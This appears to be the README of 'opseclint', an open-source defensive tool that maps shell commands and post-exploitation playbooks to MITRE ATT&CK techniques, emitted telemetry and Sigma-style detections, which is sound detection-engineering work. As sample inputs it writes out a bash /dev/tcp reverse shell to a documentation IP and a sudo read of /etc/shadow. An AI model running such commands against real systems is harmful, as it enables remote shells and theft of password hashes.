# opseclint

[![CI](https://github.com/Gerrrt/opseclint/actions/workflows/ci.yml/badge.svg)](https://github.com/Gerrrt/opseclint/actions/workflows/ci.yml)

**A detection-coverage analyzer for the command line.** Point it at a command,
a script, or a post-exploitation playbook and it statically resolves each action
to the [MITRE ATT&CK](https://attack.mitre.org/) technique(s) it implements, the
host telemetry it emits, and the detections that would fire — each with a
detectability score.

It answers one question: **"what would a defender see?"**

```
$ opseclint -c 'bash -i >& /dev/tcp/198.51.100.10/4444 0>&1'

opseclint — detection-coverage report (linux-auditd)
1 line(s) analyzed, 1 finding(s)

  L1    [CRITICAL 82]  Bash /dev/tcp reverse shell — interactive C2 channel
        technique  T1059.004 Command and Scripting Interpreter: Unix Shell
        technique  T1071 Application Layer Protocol
        telemetry  bash execve() followed by connect() to attacker IP
        telemetry  stdin/stdout/stderr duped to a socket fd
        detection  Sigma: Reverse shell via /dev/tcp redirection (proc_creation_lnx) (high confidence)

summary  loudest action: CRITICAL (82)
```

## Who it's for

- **Detection engineers** validating coverage — "if an operator ran this, would
  my ruleset catch it, and with what telemetry?"
- **Purple teams** mapping an engagement's actions to expected detections before
  and after a test.
- **Red teams** operating under authorization who need to understand and report
  the telemetry footprint of a playbook.

### Scope

opseclint describes **detectability** — the defensive signal an action
generates. It is not an evasion tool: it does not recommend "quieter"
alternatives or ways to defeat a detection. Absence of a finding means only that
nothing in the knowledge base matched — it is never a claim that an action is
stealthy.

## Install

```bash
cargo install --path .
# or, from a checkout:
cargo build --release   # -> target/release/opseclint
```

## Usage

```bash
opseclint script.sh                 # analyze a file
opseclint -c 'sudo cat /etc/shadow' # analyze a single command
cat playbook.sh | opseclint         # read from stdin

opseclint script.sh --min 50        # only show findings >= detectability 50
opseclint script.sh --json          # machine-readable output
opseclint script.sh --sarif         # SARIF 2.1.0 (GitHub code scanning)
opseclint script.sh --ci --threshold 70   # exit 1 if loudest action >= 70
```

### GitHub code scanning

`--sarif` emits SARIF 2.1.0, so findings can surface in a repo's **Security →
Code scanning** tab. Each finding maps to a rule (tagged with its ATT&CK
technique and a `security-severity` derived from the detectability score) and is
anchored to the line of the analyzed file. See [`.github/workflows/ci.yml`](.github/workflows/ci.yml)
for a job that runs opseclint and uploads the results.

### CI gating

`--ci` makes opseclint a gate: it exits non-zero when the loudest modeled action
meets or exceeds `--threshold` (default 50), so a team can fail a pipeline on
tradecraft that exceeds an agreed noise budget.

```yaml
# .github/workflows/opsec.yml (example)
- run: opseclint playbooks/ --ci --threshold 75
```

## Detectability score

A 0–100 estimate of how strongly an action surfaces in defensive telemetry
(higher = louder), bucketed as:

| Score  | Severity  |
|--------|-----------|
| 0–24   | LOW       |
| 25–49  | MEDIUM    |
| 50–74  | HIGH      |
| 75–100 | CRITICAL  |

## How it works

1. **Parser** (`parser.rs`) — quote-aware tokenizer that strips comments and
   `VAR=value` assignments, splits a line on control operators (`; | & && ||`),
   unwraps `sudo`/`env`/`nohup`/… and resolves each segment to a program +
   arguments. The raw line is preserved so substring rules still match.
2. **Knowledge base** (`data/knowledge.json`) — each entry maps a command (or a
   raw pattern) to ATT&CK techniques, the telemetry it emits, representative
   Sigma-style detections, and a detectability score.
3. **Analyzer** (`analyzer.rs`) — matches every action against the KB,
   deduplicates per line, and ranks findings loudest-first.
4. **Report** (`report.rs`) — terminal or JSON output, plus the CI gate.

The KB is embedded at compile time, so opseclint ships as a single static
binary with no runtime dependencies.

### Knowledge base schema

```json
{
  "id": "shadow-read",
  "raw_contains": "/etc/shadow",
  "description": "Access to /etc/shadow — password hash exposure",
  "techniques": [{ "id": "T1003.008", "name": "OS Credential Dumping: /etc/passwd and /etc/shadow" }],
  "telemetry": ["openat() of /etc/shadow — high-signal auditd file watch"],
  "detections": [{ "source": "Sigma", "rule": "...", "confidence": "high" }],
  "noise": 85
}
```

An entry matches either by `command` (with optional `args_contains` /
`raw_contains` refinements) or by `raw_contains` alone. Adding coverage is a
data change, not a code change.

## Status & roadmap

`v0.1` is a seed: **Linux / auditd**, ~60 of the most common post-exploitation
actions across discovery, credential access, execution, persistence, defense
evasion, and container escape. On the roadmap:

- Broaden the Linux KB and add a Windows/Sysmon platform.
- Load rules directly from a SigmaHQ checkout to attach real rule IDs.
- Richer parsing (command substitution, here-docs, multi-line constructs).

**Detection references in the seed KB are representative** of publicly available
Sigma logic and should be validated against your deployed ruleset before you
rely on them.

## License

MIT
